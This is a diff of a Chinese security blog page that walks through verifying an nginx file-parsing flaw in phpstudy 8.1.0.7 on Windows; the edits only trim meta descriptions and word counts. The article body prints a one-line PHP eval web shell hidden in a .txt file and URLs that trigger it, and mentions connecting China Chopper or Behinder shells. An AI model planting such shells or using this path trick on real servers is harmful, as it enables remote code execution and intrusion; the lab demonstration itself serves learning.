@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="一、环境搭建去官网下载phpstudy版本8.1.0.7，安装过程中不能使用中文作为目录，然后安装nginx与php，运行网站。 二、验证漏洞上传文件 info.txt到www目录，保证能够解析123&amp;lt;?php @eval($_GET[&amp;quot;pass&amp;quot;]);?&amp;gt; 访问127.0.0.1/info.txt看到文件存在访问127.0.0.1/info.txt/.php?pa">
+<meta name="description" content="一、环境搭建去官网下载phpstudy版本8.1.0.7，安装过程中不能使用中文作为目录，然后安装nginx与php，运行网站。">
 <meta name="keywords" content="phpstudy">
 <meta property="og:type" content="article">
 <meta property="og:title" content="phpstudy_nginx解析漏洞验证">
 <meta property="og:url" content="https://bjj.dropsec.xyz/2020/09/03/phpstudy_nginx解析漏洞验证/index.html">
 <meta property="og:site_name" content="AJay13">
-<meta property="og:description" content="一、环境搭建去官网下载phpstudy版本8.1.0.7，安装过程中不能使用中文作为目录，然后安装nginx与php，运行网站。 二、验证漏洞上传文件 info.txt到www目录，保证能够解析123&amp;lt;?php @eval($_GET[&amp;quot;pass&amp;quot;]);?&amp;gt; 访问127.0.0.1/info.txt看到文件存在访问127.0.0.1/info.txt/.php?pa">
+<meta property="og:description" content="一、环境搭建去官网下载phpstudy版本8.1.0.7，安装过程中不能使用中文作为目录，然后安装nginx与php，运行网站。">
 <meta property="og:locale" content="/themes/next/languages/zh-Hans.yml">
-<meta property="og:updated_time" content="2020-10-20T07:47:27.372Z">
+<meta property="og:updated_time" content="2020-10-20T08:12:25.345Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="phpstudy_nginx解析漏洞验证">
-<meta name="twitter:description" content="一、环境搭建去官网下载phpstudy版本8.1.0.7，安装过程中不能使用中文作为目录，然后安装nginx与php，运行网站。 二、验证漏洞上传文件 info.txt到www目录，保证能够解析123&amp;lt;?php @eval($_GET[&amp;quot;pass&amp;quot;]);?&amp;gt; 访问127.0.0.1/info.txt看到文件存在访问127.0.0.1/info.txt/.php?pa">
+<meta name="twitter:description" content="一、环境搭建去官网下载phpstudy版本8.1.0.7，安装过程中不能使用中文作为目录，然后安装nginx与php，运行网站。">
 
 
 
@@ -436,6 +436,7 @@
 
       
         <h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><p>去官网下载phpstudy版本8.1.0.7，安装过程中不能使用中文作为目录，然后安装nginx与php，运行网站。</p>
+<a id="more"></a>
 <h2 id="二、验证漏洞"><a href="#二、验证漏洞" class="headerlink" title="二、验证漏洞"></a>二、验证漏洞</h2><p>上传文件 info.txt到www目录，保证能够解析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@eval($_GET[&quot;pass&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
 <p>访问127.0.0.1/info.txt看到文件存在<br>访问127.0.0.1/info.txt/.php?pass=phpinfo(); 看到info信息<br>访问127.0.0.1/info.txt/.php 连接菜刀<br>或上传冰蝎码.<br>访问127.0.0.1/shell.png/.php?pass=phpinfo();</p>
 <h2 id="三、原理分析"><a href="#三、原理分析" class="headerlink" title="三、原理分析"></a>三、原理分析</h2><p>这个漏洞是nginx的配置，windows存在这个问题，linux不存在这个问题</p>
@@ -605,7 +606,7 @@
      <span class="site-state-item-name">访客量</span>
 </div>
 <div class="site-state-item site-state-posts">
-      <span class="site-state-item-count">107.2k</span>
+      <span class="site-state-item-count">107.1k</span>
       <span class="site-state-item-name">总字数</span>
 </div>
           
@@ -747,7 +748,7 @@
     
       <span class="post-meta-item-text">博客总字数</span>
     
-    <span title="Site words total count">107.2k</span>
+    <span title="Site words total count">107.1k</span>
   
   <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1278048714'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1278048714%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
 </div>
